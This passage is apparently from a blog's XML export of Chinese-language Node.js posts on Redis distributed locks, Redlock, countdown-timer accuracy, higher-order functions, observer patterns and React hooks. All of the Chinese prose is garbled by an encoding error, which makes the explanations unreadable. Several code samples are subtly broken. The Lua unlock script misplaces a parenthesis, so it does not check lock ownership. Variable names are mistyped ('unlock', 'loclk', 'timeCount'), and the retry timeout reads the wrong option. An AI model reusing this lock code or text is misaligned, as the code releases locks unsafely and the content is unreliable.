·çš„é—®é¢˜ã€‚ç”±äºŽå…ˆè¯»æ•°æ®åœ¨é€šè¿‡ä¸šåŠ¡é€»è¾‘ä¿®æ”¹ä¹‹åŽè¿›è¡ŒSETæ“ä½œï¼Œè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªåŽŸå­æ“ä½œï¼Œå½“å¤šä¸ªå®¢æˆ·ç«¯å¯¹åŒä¸€ä¸ªèµ„æºè¿›è¡Œå…ˆè¯»åŽå†™æ“ä½œå°±ä¼šå¼•å‘å¹¶å‘é—®é¢˜ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦åˆ†å¸ƒå¼é”åŽ»è§£å†³ã€‚ å®žçŽ°æ€è·¯å®žçŽ°åˆ†å¸ƒå¼é”çš„æ–¹å¼ï¼šæ•°æ®åº“ã€redisã€zookeeperï¼Œé€šè¿‡redisæ¥å®žçŽ°ä¸€ä¸ªåˆ†å¸ƒå¼é”ï¼Œä¿æŒä¸‰ä¸ªç‰¹æ€§ï¼šå®‰å…¨æ€§ã€æ­»é”ã€å®¹é”™ å®‰å…¨æ€§ï¼šä¸Šé”ï¼Œåœ¨ä»»æ„æ—¶åˆ»ä¿æŒä»…æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯æŒæœ‰è¯¥é” æ­»é”ï¼šé€ æˆæ­»é”å¯èƒ½æ˜¯ç”±äºŽæŸç§åŽŸå› ï¼Œæœ¬è¯¥é‡Šæ”¾çš„é”æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œå› æ­¤åœ¨ä¸Šé”çš„æ—¶å€™å¯ä»¥åŒæ­¥è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œç”±äºŽå®¢æˆ·ç«¯è‡ªå·±çš„åŽŸå› æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œä¹Ÿè¦ä¿è¯é”èƒ½å¤Ÿè‡ªåŠ¨é‡Šæ”¾ å®¹é”™ï¼šå®¹é”™æ˜¯åœ¨å¤šèŠ‚ç‚¹çš„æ¨¡å¼ä¸‹éœ€è¦è€ƒè™‘çš„ï¼Œåªè¦ä¿è¯N/2+1èŠ‚ç‚¹å¯ç”¨ï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥æˆåŠŸèŽ·å–ã€é‡Šæ”¾é” Redisä½†å®žåŠ›åˆ†å¸ƒå¼é”å®žçŽ°åœ¨Redisçš„å•èŠ‚ç‚¹å®žä¾‹ä¸‹å®žçŽ°ä¸€ä¸ªç®€å•çš„åˆ†å¸ƒå¼é”ï¼Œä¼šå€ŸåŠ©ç®€å•luaè„šæœ¬æ¥å®žçŽ°åŽŸå­æ€§ ä¸Šé”é€šè¿‡setnxå‘½ä»¤å å‘ï¼Œä¸ºäº†é˜²æ­¢æ­»é”ï¼Œé€šå¸¸åœ¨å å‘ä¹‹åŽè¿˜ä¼šè®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´expire: 12setnx key valueexpire key seconds ä¸Šé¢çš„æ“ä½œä¸æ˜¯ä¸€ä¸ªåŽŸå­æ€§æ“ä½œï¼ŒåŽŸå­æ€§æ“ä½œæ˜¯æŒ‡å‘½ä»¤åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¹¶ä¸ä¼šè¢«å…¶ä»–çº¿ç¨‹æˆ–è€…è¯·æ±‚æ‰“æ–­ï¼Œå¦‚æžœsetnxæ‰§è¡ŒæˆåŠŸä¹‹åŽï¼Œå‡ºçŽ°ç½‘ç»œé—ªæ–­expireå‘½ä»¤ä¾¿ä¸ä¼šå¾—åˆ°æ‰§è¡Œï¼Œä¼šå¯¼è‡´æ­»é”å‡ºçŽ°ã€‚ é€šè¿‡ï¼š 1set key value [EX seconds] [PX milliseconds] [NX|XX] é‡Šæ”¾é”é‡Šæ”¾é”çš„è¿‡ç¨‹æ˜¯å°†åŽŸæ¥å æœ‰çš„å‘åˆ é™¤ï¼ŒåŠ é”çš„è¿‡ç¨‹æŠŠvalueè®¾ç½®ä¸ºä¸€ä¸ªéšæœºå€¼ï¼Œåœ¨del keyä¹‹å‰å…ˆåˆ¤æ–­è¿™ä¸ªkeyå­˜åœ¨ä¸”valueç­‰äºŽè‡ªå·±åˆ¶å®šçš„å€¼æ‰æ‰§è¡Œåˆ é™¤æ“ä½œï¼Œåˆ¤æ–­å’Œåˆ é™¤ä¸æ˜¯ä¸€ä¸ªåŽŸå­æ€§æ“ä½œï¼Œå€ŸåŠ©Luaè„šæœ¬å®žçŽ° 12345if redis.call("get",KEYS[1]) == ARGV[1] then return redis.call("del",KEYS[1])else return 0end Nodeå®žè·µåˆå§‹åŒ–è‡ªå®šä¹‰redisLock123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687class RedisLock &#123; /** * åˆå§‹åŒ– RedisLock * @param &#123;*&#125; client * @param &#123;*&#125; option */ constructor(client, options = &#123;&#125;) &#123; if (!client) &#123; throw new Error('client ä¸å­˜åœ¨') &#125; if (client.status !== 'connecting') &#123; throw new Error('client æœªæ­£å¸¸é“¾æŽ¥') &#125; this.lockLeaseTime = options.lockLeaseTime || 2; // é»˜è®¤æ‰€è¿‡æœŸæ—¶é—´ 2 ç§’ this.lockTimeout = options.lockTimeout || 5; // é»˜è®¤æ‰€è¿‡æœŸæ—¶é—´ 5 ç§’ this.expireMode = options.expireMode || 'EX'; this.setMode = options.setMode || 'NX'; this.client = client; &#125; /** * ä¸Šé”ï¼Œé€šè¿‡set å‘½ä»¤ä¼ å…¥setnx/expireæ‹“å±•å‚æ•°ï¼Œ * ä¸Šé”æˆåŠŸè¿”å›žï¼Œä¸Šé”å¤±è´¥è¿›è¡Œé‡è¯•ï¼Œ * åœ¨lockTimeout æŒ‡å®šæ—¶é—´å†…ä»æœªèŽ·å–åˆ°é”ï¼Œåˆ™èŽ·å–é”å¤±è´¥ * @param &#123;*&#125; key * @param &#123;*&#125; val * @param &#123;*&#125; expire */ async lock(key, val, expire) &#123; const start = Date.now(); const self = this; return (async function intraneLock() &#123; try &#123; const result = await self.client.set(key, val, self.expireMode, expire || self.lockLeaseTime, self.setMode); // ä¸Šé”æˆåŠŸ if (result === 'OK') &#123; console.log(`$&#123;key&#125; $&#123;val&#125; ä¸Šé”æˆåŠŸ`); return true; &#125; // é”è¶…æ—¶ if (Math.floor((Date.now() - start) / 1000) &gt; self.lockLeaseTime) &#123; console.log(`$&#123;key&#125; $&#123;val&#125; ä¸Šé”é‡è¯•è¶…æ—¶ç»“æŸ`) return false; &#125; // å¾ªçŽ¯ç­‰å¾…é‡è¯• console.log(`$&#123;key&#125; $&#123;val&#125; ç­‰å¾…é‡è¯•`) await sleep(3000); console.log(`$&#123;key&#125; $&#123;val&#125; å¼€å§‹é‡è¯•`) return intraneLock(); &#125; catch (err) &#123; throw new Error(err); &#125; &#125;)(); &#125; /** * é‡Šæ”¾é”,é€šè¿‡redis.eval(script)æ‰§è¡Œè‡ªå®šä¹‰redis luaè„šæœ¬ * @param &#123;*&#125; key * @param &#123;*&#125; val */ async unLock(key, val) &#123; const self = this; const script = ` if redis.call('get',KEYS[1] == ARGV[1]) then return redis.call('del',KEYS[1]) else return 0 end `; try &#123; const result = await self.client.eval(script, 1, key, val); if (result === 1) &#123; return true; &#125; return false; &#125; catch (err) &#123; throw new Error(err); &#125; &#125;&#125; æµ‹è¯•123456789101112131415161718192021222324252627282930const Redis = require('ioredis');const redis = new Redis(6379, '127.0.0.1');const uuidv1 = require('uuid/v1');const RedisLock = require('./redisLock');const redisLock = new RedisLock(redis);function sleep(time) &#123; return new Promise((resolve) =&gt; &#123; setTimeout(function () &#123; resolve(); &#125;, time || 1000) &#125;)&#125;async function test(key) &#123; try &#123; const id = uuidv1(); await redisLock.lock(key, id, 20); await sleep(3000); const unLock = await redisLock.unLock(key, id); console.log('unLock: ', key, id, unlock); &#125; catch (err) &#123; console.log('ä¸Šé”å¤±è´¥', err); &#125;&#125;test('name1');test('name1') åŒæ—¶è°ƒç”¨äº†ä¸¤æ¬¡testæ–¹æ³•è¿›è¡Œä¸Šé”ï¼Œåªæœ‰ç¬¬ä¸€æ¬¡æ˜¯æˆåŠŸçš„ï¼Œç¬¬äºŒæ¬¡name1 ä¸Šé”çš„æ—¶å€™å‘çŽ°key=name1å·²è¢«å å‘ï¼Œå¼€å§‹é‡è¯•ï¼Œç”±äºŽä»¥ä¸Šçš„æµ‹è¯•ä¸­è®¾ç½®äº†3ç§’ä¹‹åŽè‡ªåŠ¨é‡Šæ”¾ï¼Œname1 åœ¨ç»è¿‡ä¸¤æ¬¡é‡è¯•ä¹‹åŽä¸Šé”æˆåŠŸ 12345678name1 26e00260-0532-11ea-b978-2160dffafa30 ä¸Šé”æˆåŠŸname1 26e02970-0532-11ea-b978-2160dffafa30 ç­‰å¾…é‡è¯•name1 26e02970-0532-11ea-b978-2160dffafa30 å¼€å§‹é‡è¯•name1 26e02970-0532-11ea-b978-2160dffafa30 ç­‰å¾…é‡è¯•unLock: name1 26e00260-0532-11ea-b978-2160dffafa30 truename1 26e02970-0532-11ea-b978-2160dffafa30 å¼€å§‹é‡è¯•name1 26e02970-0532-11ea-b978-2160dffafa30 ä¸Šé”æˆåŠŸunLock: name1 26e02970-0532-11ea-b978-2160dffafa30 true Redlockç®—æ³•åœ¨Sentinel/Redis Clusterä¸‹ï¼Œå¦‚æžœå®¢æˆ·ç«¯Aåœ¨ä¸»èŠ‚ç‚¹èŽ·å–åˆ°é”ä¹‹åŽï¼Œä¸»èŠ‚ç‚¹è¿˜æœªæ¥å¾—åŠåŒæ­¥ä¿¡æ¯åˆ°ä»ŽèŠ‚ç‚¹å°±æŒ‚æŽ‰äº†ï¼Œè¿™æ—¶å€™Sentinel ä¼šé€‰ä¸¾å¦å¤–ä¸€ä¸ªä»ŽèŠ‚ç‚¹ä½œä¸ºä¸»èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯Bæ­¤æ—¶ä¹Ÿç”³è¯·ç›¸åŒçš„é”ï¼Œå°±ä¼šå‡ºçŽ°åŒä¸€ä¸ªé”è¢«å¤šä¸ªå®¢æˆ·ç«¯æŒæœ‰ï¼Œå¯¹æ•°æ®çš„æœ€ç»ˆä¸€è‡´æ€§æœ‰å¾ˆé«˜çš„è¦æ±‚è¿˜ä¸è¡Œã€‚ é‰´äºŽè¿™äº›é—®é¢˜ï¼Œå®˜æ–¹æä¾›äº†ä¸€ä¸ªä½¿ç”¨Rediså®žçŽ°åˆ†å¸ƒå¼é”çš„è§„èŒƒç®—æ³•Redlockï¼Œåœ¨å•å®žä¾‹æˆ–è€…å¤šå®žä¾‹æä¾›å¼ºæœ‰åŠ›çš„ä¿éšœï¼Œæœ¬èº«å…·å¤‡å®¹é”™èƒ½åŠ›ï¼Œä¼šä»ŽNä¸ªå®žä¾‹ä½¿ç”¨ç›¸åŒçš„keyã€éšæœºå€¼å°è¯•set ket value [EX seconds] [PX milliseconds] [NX|XX]å‘½ä»¤åŽ»èŽ·å–æ‰€ï¼Œåœ¨æœ‰æ•ˆæ—¶é—´å†…è‡³å°‘ N/2+1ä¸ªRediså®žä¾‹å–åˆ°æ‰€ï¼Œå¦åˆ™å–é”å¤±è´¥ï¼Œå¤±è´¥æƒ…å†µä¸‹å®¢æˆ·ç«¯åº”è¯¥åœ¨æ‰€æœ‰Rediså®žä¾‹ä¸Šè¿›è¡Œè§£é” 123456789101112131415161718192021222324252627const Redis = require('ioredis');const client1 = new Redis(6379, '127.0.0.1');const RedLock = require('redlock');const redlock = new RedLock([client1], &#123; retryDelay: 200, // time in ms retryCount: 5&#125;)// å¤šä¸ªRedis å®žä¾‹// const redlock = new RedLock(// [new Redis(6379, '127.0.0.1')],// [new Redis(6379, '127.0.0.2')],// [new Redis(6379, '127.0.0.3')]// )async function test(key, ttl, client) &#123; try &#123; const loclk = await redlock.lock(key, ttl); console.log(client, lock, value) &#125; catch (err) &#123; console.log(client, err); &#125;&#125;test('name1', 10000, 'client1');test('name1', 10000, 'client2'); å¯¹åŒä¸€ä¸ªkey name1 ä¸¤æ¬¡ä¸Šé”ï¼Œç”±äºŽclient1 å…ˆå–åˆ°äº†é”ï¼Œclient2 æ— æ³•èŽ·å–é”ï¼Œé‡è¯•5æ¬¡ä¹‹åŽæŠ¥é”™ï¼šLockError:Exceeded 5 attempts to lock the resource &#39;name1&#39; å¦‚ä½•è®©ç§’æ€ã€æ´»åŠ¨å€’è®¡æ—¶æ›´åŠ ç²¾ç¡®åˆ†æžä¸€ä¸‹ä»ŽèŽ·å–æœåŠ¡å™¨æ—¶é—´åˆ°å‰ç«¯æ˜¾ç¤ºå€’è®¡æ—¶çš„è¿‡ç¨‹ï¼š å®¢æˆ·ç«¯httpè¯·æ±‚æœåŠ¡å™¨æ—¶é—´ æœåŠ¡å™¨å“åº”å®Œæˆ æœåŠ¡å™¨é€šè¿‡ç½‘ç»œä¼ è¾“æ—¶é—´åˆ°å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ ¹æ®æ´»åŠ¨å¼€å§‹æ—¶é—´å’ŒæœåŠ¡å™¨æ—¶é—´å·®åšå€’è®¡æ—¶æ˜¾ç¤º æœåŠ¡å™¨å“åº”å®Œæˆçš„æ—¶é—´å°±æ˜¯æœåŠ¡å™¨æ—¶é—´ï¼Œä½†æ˜¯ç»è¿‡ç½‘ç»œä¼ è¾“å°±ä¼šæœ‰è¯¯å·®ï¼Œç”±ç½‘ç»œçŽ¯å¢ƒå†³å®šè¯¯å·®å¤§å°ï¼Œä¸€èˆ¬æ˜¯å‡ åmsæˆ–è€…å‡ ç™¾msã€‚ å¯å¾—å‡ºï¼šå½“å‰æœåŠ¡å™¨æ—¶é—´=æœåŠ¡å™¨ç³»ç»Ÿè¿”å›žæ—¶é—´+ç½‘ç»œä¼ è¾“æ—¶é—´+å‰ç«¯æ¸²æŸ“æ—¶é—´+å¸¸é‡ï¼ˆå¯é€‰ï¼‰ å‰ç«¯æ¸²æŸ“æ—¶é—´ï¼Œé¿å…ä¸åŒæµè§ˆå™¨æ¸²æŸ“å¿«æ…¢å·®å¼‚å·®å¼‚é€ æˆæ˜Žæ˜¾çš„æ—¶é—´ä¸åŒæ­¥ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨è¿”å›žå½“å‰æ—¶é—´å’Œæœ¬åœ°ç­¾å•çš„æ—¶é—´çš„å·®å€¼å¾—å‡º èŽ·å¾—æœåŠ¡å™¨æ—¶é—´åŽï¼Œå‰ç«¯è¿›å…¥å€’è®¡æ—¶è®¡ç®—å’Œè®¡æ—¶å™¨æ˜¾ç¤ºï¼Œè¦è€ƒè™‘jsä»£ç å’Œçº¿ç¨‹é˜»å¡žé€ æˆè®¡æ—¶å™¨å»¶æ—¶é—®é¢˜ï¼Œæ€è·¯æ˜¯é€šè¿‡å¼•å…¥è®¡æ•°å™¨ï¼Œåˆ¤æ–­è®¡æ—¶å™¨å»¶è¿Ÿæ‰§è¡Œçš„æ—¶é—´æ¥è°ƒæ•´ï¼Œå°½é‡è®©è¯¯å·®ç¼©å°ï¼Œä¸åŒæµè§ˆå™¨ä¸åŒæ—¶é—´æ®µæ‰“å¼€é¡µé¢å€’è®¡æ—¶è¯¯å·®å¯æŽ§åˆ¶åœ¨1sä»¥å†… 1234567891011121314151617181920212223242526272829303132// çº¿ç¨‹å ç”¨setInterval(()=&gt;&#123; var j = 0; while(j++ &lt; 100000000);&#125;,0)// å€’è®¡æ—¶let interval = 1000, ms = 50000, //ä»ŽæœåŠ¡å™¨å’Œæ´»åŠ¨å¼€å§‹æ—¶é—´è®¡ç®—å‡ºçš„æ—¶é—´å·®ï¼Œæµ‹è¯•ç”¨50000ms count=0, startTime = new Date().getTime(), timeCounter = null;if(ms &gt;=0)&#123; timeCounter = setTimeout(countDownStart,interval)&#125;function countDownStart()&#123; count++; const offset = new Date().getTime() - (startTime+count*interval); let nextTime = interval -offset; const daytohour = 0; if(nextTime &lt; 0)&#123; nextTime = 0; &#125; ms-=interval; console.log(`è¯¯å·®ï¼š$&#123;offset&#125;ms,ä¸‹ä¸€æ¬¡æ‰§è¡Œï¼š$&#123;nextTime&#125;msåŽï¼Œç¦»æ´»åŠ¨ç»“æŸè¿˜æœ‰ï¼š$&#123;ms&#125;ms`) if(ms &lt; 0)&#123; clearTimer(timeCount) &#125;else&#123; timeCounter = setTimeout(countDownStart,nextTime), &#125;&#125;]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç å³°æž¶æž„-å‡½æ•°]]></title>
    <url>%2F2019-12-07-%E7%8F%A0%E5%B3%B0%E6%9E%B6%E6%9E%84-Day1.html</url>
    <content type="text"><![CDATA[ç å³°æž¶æž„-å‡½æ•°çŸ¥è¯†ç‚¹ï¼š é«˜é˜¶å‡½æ•°ï¼Œè§£å†³å¼‚æ­¥é—®é¢˜ã€å‘å¸ƒè®¢é˜…æ¨¡å¼å’Œè§‚å¯Ÿè€…æ¨¡å¼ã€promiseæ ¸å¿ƒåº”ç”¨ï¼Œpromiseè§£å†³å¼‚æ­¥é—®é¢˜ã€å®žçŽ°ä¸€ä¸ªå®Œæˆçš„promiseåº“ã€promiseä¸­å¸¸è§çš„é¢è¯•é¢˜ã€æ‰©å±•promiseä¸­å¸¸è§çš„æ–¹æ³•ã€æŽŒæ¡ generatorçš„ä½¿ç”¨ä»¥åŠcoåº“çš„åº”ç”¨ã€å¼‚æ­¥æ–¹æ¡ˆ async+await é«˜é˜¶å‡½æ•°AOP é¢å‘åˆ‡ç‰‡ç¼–ç¨‹1234567891011121314151617181920212223242526272829303132333435363738// é«˜é˜¶å‡½æ•° å‡½æ•°å‚æ•°å¦‚æžœæ˜¯å‡½æ•°ï¼Œæˆ–è€…è¿™ä¸ªå‡½æ•°è¿”å›žä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œæˆ‘ä»¬å°±å«å®ƒé«˜é˜¶å‡½æ•°// AOP é¢å‘åˆ‡ç‰‡ç¼–ç¨‹// beforeå‡½æ•°function say(who) &#123; console.log(who + ' hello')&#125;Function.prototype.before = function (beforeFn) &#123; return (...args) =&gt; &#123; beforeFn(); this(...args); &#125;&#125;Function.prototype.after = function (afterFn) &#123; return (...args) =&gt; &#123; this(...args); afterFn(); &#125;&#125;let beforeSay = say.before(() =&gt; &#123; console.log('å¼€å§‹è¯´è¯')&#125;)let afterSay = beforeSay.after(() =&gt; &#123; console.log('ç»“æŸè¯´è¯')&#125;)afterSay('laibh.top');/**å¼€å§‹è¯´è¯laibh.top helloç»“æŸè¯´è¯*/ Reactäº‹åŠ¡ç®€å•æ¨¡æ‹Ÿ123456789101112131415161718192021222324252627282930313233343536373839class Transaction &#123; perform(anyMethod, wrappers) &#123; wrappers.forEach(wrapper =&gt; wrapper.initialize()) anyMethod(); wrappers.forEach(wrapper =&gt; wrapper.close()) &#125;&#125;let transaction = new Transaction()let oldFunc = () =&gt; &#123; console.log('åŽŸæœ‰çš„é€»è¾‘')&#125;transaction.perform(oldFunc, [ &#123; // wrapper1 initialize() &#123; console.log('åˆå§‹åŒ–1') &#125;, close() &#123; console.log('å…³é—­1') &#125; &#125;, &#123; // wrapper2 initialize() &#123; console.log('åˆå§‹åŒ–2') &#125;, close() &#123; console.log('å…³é—­2') &#125; &#125;])/**åˆå§‹åŒ–1åˆå§‹åŒ–2åŽŸæœ‰çš„é€»è¾‘å…³é—­1å…³é—­2*/ åˆ¤æ–­ç±»åž‹1234567891011121314151617// åˆ¤æ–­æ•°æ®ç±»åž‹// typeof instaceof constructor Object.prototype.toString.callfunction isType(type) &#123; return (args) =&gt; Object.prototype.toString.call(args) === `[object $&#123;type&#125;]`&#125;const types = ['String', 'Boolean', 'Number', 'Null', 'Undefined', 'Symbol', 'Object']const utils = &#123;&#125;for (let i = 0; i &lt; types.length; i++) &#123; let type = types[i] utils[`is$&#123;type&#125;`] = isType(type)&#125;console.log(utils.isSymbol(Symbol())) å¼‚æ­¥å¹¶å‘ lodash after1234567891011121314151617181920212223242526272829303132333435363738394041424344// lodash after åœ¨æ‰§è¡Œå¤šå°‘æ¬¡ä¹‹åŽ// åšå¼‚æ­¥çš„å¹¶å‘å¤„ç†function after(times, callback) &#123; return () =&gt; &#123; if (--times == 0) &#123; callback(); &#125; &#125;&#125;let fn = after(3, () =&gt; &#123; console.log('æ‰§è¡Œä¸‰æ¬¡åŽæ‰æ‰§è¡Œ')&#125;)fn()fn()fn()// node æ–¹æ³•å¼‚æ­¥çš„ I/Olet fs = require('fs')const after = (times, callback) =&gt; &#123; let website = &#123;&#125; return (key, value) =&gt; &#123; website[key] = value if (--times === 0) &#123; callback(website) &#125; &#125;&#125;const out = after(2, (website) =&gt; &#123; console.log(website)&#125;)fs.readFile('./name.txt', 'utf8', (err, data) =&gt; &#123; out('name', data)&#125;);fs.readFile('./age.txt', 'utf8', (err, data) =&gt; &#123; out('age', data)&#125;); å‘å¸ƒè®¢é˜…æ¨¡å¼å’Œè§‚å¯Ÿè€…æ¨¡å¼å‘å¸ƒè®¢é˜…è§£å†³å¼‚æ­¥123456789101112131415161718192021222324252627282930313233343536373839// node æ–¹æ³•å¼‚æ­¥çš„ I/Olet fs = require('fs')// å¸Œæœ›ä¸¤æ¬¡éƒ½å®ŒæˆåŽï¼Œåˆ†åˆ«æ‰“å°æœ€ç»ˆç»“æžœï¼Œå†æ‰“å°ä¸€æ¬¡å·²ç»å¤„ç†å®Œæ¯•çš„// å‘å¸ƒemit è®¢é˜… on ä¸€ç§ä¸€å¯¹å¤šçš„å…³ç³» [fn,fn,fn]class Events &#123; constructor() &#123; this.stack = [] &#125; on(callback) &#123; this.stack.push(callback) &#125; emit() &#123; this.stack.forEach(callback =&gt; callback()) &#125;&#125;let events = new Events();let website = &#123;&#125;;events.on(() =&gt; &#123; if (Object.keys(website).length === 2) &#123; console.log(website) &#125; console.log('å½“å‰èŽ·å–å®Œæ¯•')&#125;)fs.readFile('./name.txt', 'utf8', (err, data) =&gt; &#123; website.name = data events.emit();&#125;);fs.readFile('./age.txt', 'utf8', (err, data) =&gt; &#123; website.age = data events.emit();&#125;); è§‚å¯Ÿè€…æ¨¡å¼ç®€å•æ¨¡æ‹Ÿ12345678910111213141516171819202122232425262728293031// è§‚å¯Ÿè€…æ¨¡å¼class Subject &#123; // è¢«è§‚å¯Ÿè€… constructor() &#123; this.stack = []; this.state = 'happy' &#125; attach(observer) &#123; this.stack.push(observer) &#125; setState(newState) &#123; this.state = newState this.stack.forEach(p =&gt; p.update(newState)) &#125;&#125;class Observer &#123; // è§‚å¯Ÿè€… constructor(name) &#123; this.name = name &#125; update(newState) &#123; console.log(`$&#123;this.name&#125;,å°å®å®$&#123;newState&#125;`) &#125;&#125;let p1 = new Observer('çˆ¸çˆ¸')let p2 = new Observer('å¦ˆå¦ˆ')let c = new Subject('å°å®å®')c.attach(p1)c.attach(p2)c.setState('unhappy') Promise]]></content>
      <categories>
        <category>ç å³°æž¶æž„</category>
      </categories>
      <tags>
        <tag>ç å³°æž¶æž„</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react hookå®žè·µ]]></title>
    <url>%2F2019-10-26-react%20hook%E5%AE%9E%E8%B7%B5.html</url>
    <content type="text"><![CDATA[react hookå®žè·µåˆåˆ°äº†è·Ÿç€æ–‡æ¡£ç å­—å­¦ä¹ çš„é˜¶æ®µï¼Œhookä»Žææ¡ˆåˆ°çŽ°åœ¨å·²ç»å¾ˆä¹…äº†ã€‚åœ¨è¿™ä¹‹å‰ä½†æ˜¯è¿˜æ²¡æœ‰çœŸæ­£åœ°åŽ»äº†è§£è¿™ä¸ª react æ–°çŽ©å…·ã€‚è·Ÿéšæ–‡æ¡£å­¦ä¹ ï¼Œå¹¶å°è¯•é‡æž„ä¸€äº›é¡¹ç›® ç®€ä»‹å®˜æ–¹è‡ªå¸¦çš„è§†é¢‘å·²ç»å¾ˆå¥½åœ°ä»‹ç»äº† hook æ¦‚è§ˆHook æ˜¯ React.16.8 æ–°å¢žç‰¹å¾ï¼Œå¯ä»¥è®©ä½ åœ¨ä¸ç¼–å†™ classçš„æƒ…å†µä¸‹ä½¿ç”¨ state ä»¥åŠå…¶ä»– React ç‰¹æ€§ State Hookç®€å•çš„ç¤ºä¾‹ï¼š 12345678910111213import React,&#123;useState&#125; from 'react'function Example()&#123; const [count,setCount] = useState(0) return( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125; é€šè¿‡åœ¨å‡½æ•°ç»„ä»¶é‡Œè°ƒç”¨å®ƒæ¥ç»™ç»„ä»¶æ·»åŠ ä¸€äº›å†…éƒ¨çš„ stateï¼ŒReact ä¼šåœ¨æ¸²æŸ“çš„æ—¶å€™ä¿ç•™è¿™ä¸ª stateã€‚useStateä¼šè¿”å›žä¸€å †å€¼ï¼šå½“å‰å€¼å’Œä¸€ä¸ªè®©ä½ æ›´æ–°å®ƒçš„å‡½æ•°ï¼Œå¯ä»¥åœ¨æ—¶é—´å¤„ç†å‡½æ•°ä¸­æˆ–è€…å…¶ä»–ä¸€äº›åœ°æ–¹è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ç±»ä¼¼ classç»„ä»¶çš„ this.setStateï¼Œä½†æ˜¯å®ƒä¸ä¼šæŠŠæ–°çš„ stateå’Œæ—§çš„ stateè¿›è¡Œåˆå¹¶ã€‚ useState å”¯ä¸€çš„å‚æ•°å°±æ˜¯åˆå§‹çš„stateã€‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œè®¡æ•°å™¨ä»Žé›¶å¼€å§‹çš„ï¼Œæ‰€æœ‰åˆå§‹ stateå°±æ˜¯0ã€‚æ³¨æ„ä¸åŒäºŽ this.stateï¼Œè¿™é‡Œçš„ stateä¸ä¸€å®šè¦æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚ å£°æ˜Žå¤šä¸ªå˜é‡åœ¨ä¸€ä¸ªç»„ä»¶ä¸­å£°æ˜Žå¤šä¸ªå˜é‡ 12345function ExampleWithManyStates()&#123; const [age,setAge] = useState(42) const [fruit,setFruit] = useState('banana') const [todos,setTodos] = useState(&#123;text:'Learn Hooks'&#125;)&#125; Hook?Hook æ˜¯ä¸€äº›å¯ä»¥è®©ä½ åœ¨å‡½æ•°ç»„ä»¶é‡Œ é’©å…¥ React stateä»¥åŠç”Ÿå‘½å‘¨æœŸå‡½æ•°ç­‰ç‰¹æ€§çš„å‡½æ•°ã€‚Hook ä¸èƒ½åœ¨ class ç»„ä»¶ä¸­ä½¿ç”¨ã€‚ä½¿å¾—ä¸ç”¨ class ä¹Ÿå¯ä»¥ä½¿ç”¨ React. Effect HookReact ç»„ä»¶ä¸­æ•°æ®èŽ·å–ã€è®¢é˜…æˆ–è€…æ‰‹åŠ¨ä¿®æ”¹ DOM,éƒ½ç»Ÿç§°ä¸ºå‰¯ä½œç”¨ï¼Œæˆ–è€…ç§°ä¸ºä½œç”¨ useEffectå°±æ˜¯ Effect Hookï¼Œç»™å‡½æ•°ç»„ä»¶å¢žåŠ äº†æ“ä½œå‰¯ä½œç”¨çš„èƒ½åŠ›ï¼Œè·Ÿ class ç»„ä»¶çš„ componentDidã€componentDidUpdateã€componentWillUnmountå…·æœ‰ç›¸åŒçš„ç”¨é€”ï¼Œåªä¸è¿‡è¢«åˆå¹¶æˆäº†ä¸€ä¸ªAOU ä¾‹å­ï¼Œåœ¨ React æ›´æ–° DOM åŽè®¾ç½®ä¸€ä¸ªé¡µé¢çš„æ ‡é¢˜ 123456789101112131415161718import React, &#123; useState, useEffect &#125; from 'react'function Example()&#123; const [count, setCount] = useState(0) // ç›¸å½“äºŽ componentDidMount å’Œ componentDidUpdate useEffect(()=&gt;&#123; document.title = `laibh.top you check $&#123;count&#125; times` &#125;) return( &lt;div&gt; &lt;p&gt;You click &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125; å½“è°ƒç”¨ useEffectï¼Œå°±æ˜¯åœ¨å‘Šè¯‰ React åœ¨å®Œæˆå¯¹ DOM çš„æ›´æ”¹åŽè¿è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œç”±äºŽå‰¯ä½œç”¨å‡½æ•°æ˜¯åœ¨ç»„ä»¶å†…å£°æ˜Žçš„ï¼Œæ‰€æœ‰å¯ä»¥è®¿é—®åˆ°ç»„ä»¶çš„ propsæˆ–è€… stateã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒReact ä¼šåœ¨æ¯æ¬¡æ¸²æŸ“åŽè°ƒç”¨å‰¯ä½œç”¨å‡½æ•°â€”â€”åŒ…æ‹¬ç¬¬ä¸€æ¬¡æ¸²æŸ“çš„æ—¶å€™ å‰¯ä½œç”¨å‡½æ•°è¿˜å¯ä»¥é€šè¿‡è¿”å›žä¸€ä¸ªå‡½æ•°æ¥æŒ‡å®šæ¸…é™¤å‰¯ä½œç”¨ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„ç»„ä»¶ä¸­ä½¿ç”¨å‰¯ä½œç”¨å‡½æ•°æ¥è®¢é˜…å¥½å‹çš„åœ¨çº¿çŠ¶æ€ï¼Œå¹¶é€šè¿‡å–æ¶ˆè®¢é˜…æ¥è¿›è¡Œæ¸…é™¤æ“ä½œï¼š 123456789101112131415161718import React,&#123;useState,useEffect&#125; from 'react'function FriendStatus(props)&#123; const [isOnline,setIsOnline] = useState(null) function handleStatusChange(status)&#123; 